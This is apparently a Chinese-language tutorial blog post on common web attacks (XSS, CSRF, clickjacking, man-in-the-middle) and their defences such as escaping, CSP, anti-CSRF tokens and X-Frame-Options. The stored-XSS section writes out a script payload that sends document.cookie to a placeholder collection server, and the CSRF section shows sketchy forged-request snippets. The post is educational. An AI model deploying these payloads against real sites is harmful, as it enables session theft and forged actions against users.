---
title: Web安全
date: 2020-03-09
tags:
 - Web安全
categories:
 -  Browser
sidebar: auto
---

![](https://resource.limeili.co/abstract/abstract%20(51).jpg)
<!-- more -->

## 1.XSS
XSS (Cross-Site Scripting)，跨站脚本攻击,攻击者想尽一切办法将可执行代码注入到网页中，当用户访问被XSS脚本诸如的网页，XSS脚本就会被提取出来，用户浏览器就会解析这段XSS代码，也就是用户被攻击了  
* 弹窗警告
* 页面嵌套
* 页面重定向
* 弹框警告并重定向
* 访问恶意代码
* 收集用户cookie
### XSS分类
1. 反射型  
发起请求时XSS代码在URL中作为参数提交到服务器，服务器解析后XSS随响应内容一起传给浏览器，最后浏览器执行XSS代码  
恶意代码并没有保存在目标网站而是引诱用户点击一个恶意链接，发生在用户交互的地方  


2. 存储型  
恶意数据保存在数据库，所有用户浏览页面的时候都会被攻击，大部分在表单提交上发生，评论框  
`获取cookie`  
* 构建收集cookie服务器
* 构造XSS代码并植入到web服务器
* 等待肉鸡触发XSS代码并将cookie发送到黑客服务器
`<script>window.open('http://xxx.xxx/cookie_rec.php?cookie='+document.cookie')</script>`
* cookie利用

### 防御
1. 转义字符  
用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义  
但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。
2. CSP   
CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。  
* 设置 HTTP Header 中的 Content-Security-Policy 
* 设置 meta 标签的方式 `<meta http-equiv="Content-Security-Policy ">`

## 2.CSRF  
CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作,伪装来自收信人用户的请求来利用受信任的网站  
1. 受害者登录信任网站A，保留了cookie
2. 在受害者没有登出A网站的情况下，攻击者引诱受害者访问B网站
3. B网站向A网站发一个请求，a.com/action=xxx浏览器默认携带A的cookie
4. A收到请求验证确认误以为受害者自己请求的
5. 以受害者的名义执行了act=xxx  
`触发`  
```js
//GET 非常简单只需要一个http请求
<img src="..../action.php?username=1%money=100$submit=..." alt="嘻嘻">
```
```js
//POST 通常使用一个自动提交的表单
<form action="" method="post">
    <input type="hidden" value=>
<script> document.forms[0].submit()  
```
特点：  
* 通常发生在第三方
* 不能获取到cookie只能使用

### 防御
1.  Referer Check
HTTP Referer是header的一部分，当浏览器向web服务器发送请求时，一般会带上Referer信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御CSRF攻击。正常请求的referer具有一定规律，如在提交表单的referer必定是在该页面发起的请求。所以通过检查http包头referer的值是不是这个页面，来判断是不是CSRF攻击。
但在某些情况下如从https跳转到http，浏览器处于安全考虑，不会发送referer，服务器就无法进行check了。若与该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖Referer Check作为防御CSRF的主要手段。但是可以通过Referer Check来监控CSRF攻击的发生。
2. Anti CSRF Token  
目前比较完善的解决方案是加入Anti-CSRF-Token。即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。
这种方法相比Referer检查要安全很多，token可以在用户登陆后产生并放于session或cookie中，然后在每次请求时服务器把token从session或cookie中拿出，与本次请求中的token 进行比对。由于token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。但在处理多个页面共存问题时，当某个页面消耗掉token后，其他页面的表单保存的还是被消耗掉的那个token，其他页面的表单提交时会出现token错误。
3. 验证码  
应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制CSRF攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。

## 中间人攻击
使用https

## 点击劫持   
点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。  
### 防御
1. X-FRAME-OPTIONSX
X-FRAME-OPTIONS是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。  
该响应头有三个值可选，分别是 

* DENY，表示页面不允许通过 iframe 的方式展示
* SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
* ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示